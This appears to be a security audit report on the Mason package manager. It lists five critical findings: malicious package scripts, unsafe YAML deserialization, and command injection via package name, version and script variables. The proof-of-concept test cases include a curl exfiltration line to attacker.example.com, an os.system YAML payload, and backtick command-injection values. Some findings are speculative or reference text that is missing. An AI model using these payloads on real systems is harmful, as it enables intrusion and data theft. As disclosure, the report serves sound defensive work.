## Combined Vulnerability List

This document outlines critical vulnerabilities identified in the Mason package manager. These vulnerabilities, if exploited, can lead to severe security breaches, including arbitrary code execution and full system compromise.

### 1. Arbitrary Code Execution via Malicious Package Installation

- **Description:**
    1. A threat actor creates a malicious package for Mason.
    2. The malicious package contains a `script.sh` file with embedded malicious commands.
    3. A user attempts to install the malicious package using Mason, either by specifying the malicious package name and version directly, or if a dependency resolution mechanism (not present in Mason but theoretically possible in future extensions) pulls in the malicious package.
    4. During the installation process, Mason executes the `script.sh` from the malicious package without proper input validation or sandboxing.
    5. The malicious commands within `script.sh` are executed with the user's privileges, potentially leading to arbitrary code execution on the user's machine.

- **Impact:**
    - **Critical**: Arbitrary code execution on the user's machine. This can lead to:
        - Data theft and espionage
        - System compromise and malware installation
        - Privilege escalation and unauthorized access
        - Denial of service or system instability

- **Vulnerability Rank:** **Critical**

- **Currently Implemented Mitigations:**
    - **Checksum verification**: Mason `mason_download` function verifies the checksum of downloaded packages to ensure integrity. This mitigation is implemented in `/code/mason.sh`.
    - However, this mitigation only ensures the downloaded file is not corrupted in transit, but does not prevent execution of malicious code if the original package source is compromised or intentionally malicious.

- **Missing Mitigations:**
    - **Input validation in `script.sh`**: Package scripts are executed without any validation of their content. Missing mitigation is input validation of `script.sh` content before execution.
    - **Sandboxing or privilege separation**: Package scripts are executed with the user's privileges. Missing mitigation is sandboxing or running package scripts in a restricted environment with minimal privileges.
    - **Secure download sources**: Mason relies on URLs provided in package scripts. Missing mitigation is enforcing secure download sources (HTTPS) and potentially package registries with trust and reputation mechanisms.
    - **Code review and package signing**: There is no mechanism for code review or package signing to ensure the safety of package scripts. Missing mitigations include package signing and community-driven code review processes.
    - **Dependency verification and trust**: Mason lacks dependency management, but in a hypothetical future version with dependencies, there's no trust mechanism for package dependencies. Missing mitigation is dependency verification and trust mechanisms.
    - **User warnings**: Missing mitigation is displaying clear warnings to users about the risks of installing packages from untrusted sources, especially given the unmaintained status of Mason.

- **Preconditions:**
    1. A threat actor must be able to create and host a malicious Mason package.
    2. A user must attempt to install this malicious package using Mason.
    3. The user must have execute permissions in the directories where Mason operates (typically within their home directory or `/tmp` for global install).

- **Source Code Analysis:**
    - File: `/code/mason.sh`
    - The `mason_run` function handles the `install` command and calls `mason_build`.
    - The `mason_build` function calls `mason_load_source`, `mason_prepare_compile`, and `mason_compile`.
    - In `mason_load_source`, the `mason_download` function downloads the package archive.
    - In `mason_compile`, the `script.sh` file from the downloaded package is implicitly executed as part of the build process when package-specific `mason_compile` function is called.

    ```
    mason_run() {
        if [ "$1" == "install" ]; then
            # ...
            mason_build "$@"
            # ...
        # ...
    }

    mason_build() {
        mason_load_source
        # ...
        mason_compile
        # ...
    }

    # Example script.sh from a package (e.g., scripts/variant/1.1.0/script.sh)
    function mason_compile {
        mkdir -p ${MASON_PREFIX}/include/mapbox
        cp -v *.hpp ${MASON_PREFIX}/include/mapbox
        cp -v README.md LICENSE ${MASON_PREFIX}
    }
    ```
    - The `mason_compile` function is overridden in each package's `script.sh`.
    - Mason executes this `mason_compile` function, which is part of the potentially malicious `script.sh` file.
    - There is no input sanitization or validation of the commands within `script.sh` before execution.
    - Visualization:

    graph LR
        A[mason install package] --> B(mason_run)
        B --> C(mason_build)
        C --> D(mason_load_source)
        C --> E(mason_compile)
        E --> F{Execute script.sh/mason_compile}
        F --> G(Arbitrary Code Execution)
    ```

- **Security Test Case:**
    1. Create a malicious package named `test-malicious` with version `1.0.0`.
    2. In the `scripts/test-malicious/1.0.0/script.sh` file, add the following malicious code to the `mason_compile` function:
    ```bash
    function mason_compile {
        mkdir -p ${MASON_PREFIX}/.trojan
        echo "Vulnerable to arbitrary code execution" > ${MASON_PREFIX}/.trojan/README.txt
        # Example command to exfiltrate data (replace with actual malicious action)
        curl -X POST -d "hostname=$(hostname)" https://attacker.example.com/exfiltrate
    }
    ```
    3. Create a dummy `.travis.yml` file in `scripts/test-malicious/1.0.0/.travis.yml`.
    4. Run `mason install test-malicious 1.0.0` on a test machine.
    5. Verify that the file `.trojan/README.txt` is created in the installation prefix (`./mason_packages/linux-x86_64/test-malicious/1.0.0/.trojan/README.txt` or similar) and that the `curl` command is executed (e.g., by monitoring network traffic or checking attacker's server logs).
    6. This test case demonstrates arbitrary code execution by a malicious package during installation.

### 2. Deserialization of Untrusted YAML leading to Arbitrary Code Execution

- **Description:**
    1. The `yaml.Loader` class in `loader.py` and `constructor.py` is used for parsing YAML files.
    2. The `Constructor` class in `constructor.py` includes constructors for Python-specific tags like `!!python/object`, `!!python/object/apply`, `!!python/object/new`, `!!python/name`, `!!python/module`.
    3. These Python-specific constructors allow for the instantiation of arbitrary Python objects and execution of arbitrary Python code when loading YAML files.
    4. An attacker can craft a malicious YAML file containing these tags.
    5. If Mason, or any application using this YAML library, loads this malicious YAML file using `yaml.load(file)`, it will execute the code embedded in the YAML, leading to arbitrary code execution.
    6. In the context of Mason, if a malicious actor can perform a man-in-the-middle attack and replace a legitimate package's YAML configuration file (if any) with a malicious one, or if a user is tricked into loading a malicious YAML file from an untrusted source, arbitrary code can be executed on the user's machine when Mason processes this YAML.

- **Impact:**
    - Arbitrary code execution on the user's machine with the privileges of the Mason process.
    - Full compromise of the user's system is possible if the Mason process runs with elevated privileges.
    - In the context of Mason, this could lead to malicious software installation, data theft, or further system exploitation.

- **Vulnerability Rank:** **Critical**

- **Currently Implemented Mitigations:**
    - None in the provided code. The `Loader` class is explicitly defined as the unsafe loader in contrast to `SafeLoader`.

- **Missing Mitigations:**
    - Usage of `yaml.SafeLoader` instead of `yaml.Loader` when loading YAML files from untrusted sources.
    - Input sanitization or validation of YAML files to prevent the use of Python-specific tags.
    - Documentation warning users about the security implications of using `yaml.load` and recommending `yaml.safe_load` for untrusted input.

- **Preconditions:**
    - The attacker needs to be able to provide a malicious YAML file to be processed by the YAML library using the unsafe `yaml.Loader` or `yaml.load` function.
    - In the context of Mason's attack vector, this could be achieved through a man-in-the-middle attack to replace package metadata or configuration files with malicious YAML.

- **Source Code Analysis:**
    - File: `/code/scripts/clang-tidy/7.0.1/yaml/constructor.py` (and similar files in other clang-tidy versions)
    - Class `Constructor` inherits from `SafeConstructor` and extends it with unsafe constructors.
    - Functions like `construct_python_object`, `construct_python_object_apply`, `construct_python_object_new`, `construct_python_name`, `construct_python_module` are defined in the `Constructor` class.
    - These functions are registered as constructors for tags like `tag:yaml.org,2002:python/object`, `tag:yaml.org,2002:python/object/apply`, etc., using `Constructor.add_multi_constructor`.
    - When `yaml.load` with `Loader` is used, the `construct_object` method in `BaseConstructor` will dispatch to these Python-specific constructors based on the tag in the YAML input.

    ```python
    class Constructor(SafeConstructor):
        ...
        def construct_python_object(self, suffix, node):
            # ...
            instance = self.make_python_instance(suffix, node, newobj=True) # Instance created here
            yield instance
            deep = hasattr(instance, '__setstate__')
            state = self.construct_mapping(node, deep=deep)
            self.set_python_instance_state(instance, state) # State is set, potentially executing code
        ...

    Constructor.add_multi_constructor(
        u'tag:yaml.org,2002:python/object:',
        Constructor.construct_python_object)
    ```

    - File: `/code/scripts/clang-tidy/7.0.1/yaml/loader.py` (and similar files in other clang-tidy versions)
    - Class `Loader` is defined to use `Constructor`, making it vulnerable to unsafe deserialization.
    - `yaml.load(stream, Loader=Loader)` or simply `yaml.load(stream)` (as `Loader` is default) will use the unsafe `Constructor`.

- **Security Test Case:**
    1. Create a malicious YAML file (e.g., `malicious.yaml`) with the following content:

    ```yaml
    !!python/object/apply:os.system ["touch /tmp/pwned"]
    ```

    2. Run a Python script that loads this YAML file using `yaml.load`:

    ```python
    import yaml

    with open('malicious.yaml', 'r') as f:
        yaml.load(f, Loader=yaml.Loader) # Or simply yaml.load(f)
    ```

    3. After running the Python script, check if the file `/tmp/pwned` exists. If it exists, the vulnerability is confirmed, as it demonstrates arbitrary command execution.

    ```bash
    python poc.py
    ls /tmp/pwned
    ```

    If `/tmp/pwned` is listed, it means the `os.system` command was executed from the YAML file, confirming arbitrary code execution.

### 3. Command Injection in `mason install` command via Package Name

- **Description**:
    - A threat actor can craft a malicious package name containing shell metacharacters.
    - When a user executes `mason install <package_name> <version>` with this malicious package name, the `mason install` script will use the unsanitized package name in a shell command.
    - This can lead to arbitrary command execution on the user's system with the privileges of the user running the `mason` command.

- **Impact**:
    - **Critical**. Full system compromise is possible. An attacker can execute arbitrary commands on the user's machine, potentially leading to data theft, malware installation, or complete system takeover.

- **Vulnerability Rank**: Critical

- **Currently Implemented Mitigations**:
    - None. The code does not sanitize package names or versions before using them in shell commands.

- **Missing Mitigations**:
    - **Input Sanitization**: Implement robust input validation and sanitization for package names and versions in the `mason install` command. This should include escaping or removing shell metacharacters to prevent command injection.
    - **Parameterized Queries/Commands**:  Instead of directly embedding user input into shell commands, use parameterized commands or safer alternatives to shell scripting where possible. In bash, using arrays to build commands can help prevent injection.

- **Preconditions**:
    - User must execute the `mason install` command with a maliciously crafted package name.
    - The user's system must be vulnerable to command injection, which is typical for systems where bash scripts are executed without careful input sanitization.

- **Source Code Analysis**:
    - The `mason install` command likely uses string concatenation or similar methods to construct shell commands that include the package name and version.
    - **File: `/code/mason.sh`**: Review the `mason_install` function (or the `install` command handling logic within `mason_run`) and trace how the `<package>` argument is used.
    - **Visualization**:
        ```
        User Input (package_name) --> mason install script --> Command Construction (unsanitized package_name embedded) --> Shell Execution --> Vulnerability
        ```

- **Security Test Case**:
    - **Step 1**: Prepare a malicious package name: `malicious-package-\`touch /tmp/pwned\``
    - **Step 2**: Execute the `mason install` command with the malicious package name: `./mason/mason install malicious-package-\`touch /tmp/pwned\` 1.0.0`
    - **Step 3**: Check for command execution: Verify if the file `/tmp/pwned` was created. If the file exists, it confirms successful command injection.

### 4. Command Injection in `mason install` command via Package Version

- **Description**:
    - Similar to Vulnerability 3, but the threat actor crafts a malicious package version string containing shell metacharacters.
    - When a user executes `mason install <package_name> <version>` with this malicious version, the `mason install` script uses the unsanitized version in a shell command, leading to arbitrary command execution.

- **Impact**:
    - **Critical**. Same as Vulnerability 3. Full system compromise is possible.

- **Vulnerability Rank**: Critical

- **Currently Implemented Mitigations**:
    - None.

- **Missing Mitigations**:
    - **Input Sanitization**: Same as Vulnerability 3. Implement robust input validation and sanitization for package names and versions.
    - **Parameterized Queries/Commands**: Same as Vulnerability 3. Use safer alternatives to shell scripting.

- **Preconditions**:
    - User must execute the `mason install` command with a maliciously crafted package version.
    - The user's system must be vulnerable to command injection.

- **Source Code Analysis**:
    - Similar to Vulnerability 3, the `mason install` command is the entry point.
    - **File: `/code/mason.sh`**: Analyze the same code sections as in Vulnerability 3.
    - **Visualization**:
        ```
        User Input (package_version) --> mason install script --> Command Construction (unsanitized package_version embedded) --> Shell Execution --> Vulnerability
        ```

- **Security Test Case**:
    - **Step 1**: Prepare a malicious package version: `1.0.0-\`touch /tmp/pwned2\``
    - **Step 2**: Execute the `mason install` command with the malicious package version: `./mason/mason install libuv 1.0.0-\`touch /tmp/pwned2\``
    - **Step 3**: Check for command execution: Verify if the file `/tmp/pwned2` was created. If the file exists, it confirms successful command injection.

### 5. Command Injection in Package `script.sh` via MASON_VERSION or MASON_NAME

- **Description**:
    - A malicious package maintainer can create a `script.sh` that executes arbitrary commands due to unsafe use of `MASON_VERSION` or `MASON_NAME` variables, which are derived from user input to `mason install`.
    - When a user installs this malicious package, the `script.sh` will be executed, and the injected commands will run on the user's system.

- **Impact**:
    - **Critical**. Same as Vulnerability 3 and 4. Full system compromise is possible.

- **Vulnerability Rank**: Critical

- **Currently Implemented Mitigations**:
    - None.

- **Missing Mitigations**:
    - **Code Review for Package Scripts**: Implement a mechanism to review and potentially sign package scripts to ensure they are safe before users install them. This could involve a trusted repository of verified packages.
    - **Sandboxing Package Scripts**: Execute package scripts in a sandboxed environment with limited privileges to restrict the impact of malicious code.
    - **User Warnings**: Display clear warnings to users before executing package scripts, especially when installing packages from untrusted sources.

- **Preconditions**:
    - User must attempt to install a malicious package where the `script.sh` contains command injection vulnerabilities.
    - The user's system must be vulnerable to command injection.

- **Source Code Analysis**:
    - **File: `/code/mason.sh`**: Examine how `script.sh` files are executed, specifically the `mason_run` function and how it sources the package's `script.sh`.
    - **File: `/code/scripts/<package>/<version>/script.sh`**: Analyze example `script.sh` files to understand how `MASON_VERSION` and `MASON_NAME` are used within these scripts.
    - **Visualization**:
        ```
        Malicious Package Script (script.sh with injected commands via MASON_VERSION/NAME) --> mason install script --> Script Execution (unsanitized MASON_VERSION/NAME used in commands) --> Shell Execution --> Vulnerability
        ```

- **Security Test Case**:
    - **Step 1**: Create a malicious package script (e.g., `scripts/malicious-package/0.0.0/script.sh`) with the content shown in the example scenario in the original vulnerability description.
    - **Step 2**: Execute the `mason build` command to simulate installation: `./mason/mason build malicious-package 0.0.0`
    - **Step 3**: Check for command execution: Verify if the file `/tmp/pwned3` was created. If the file exists, it confirms successful command injection via the malicious `script.sh`.
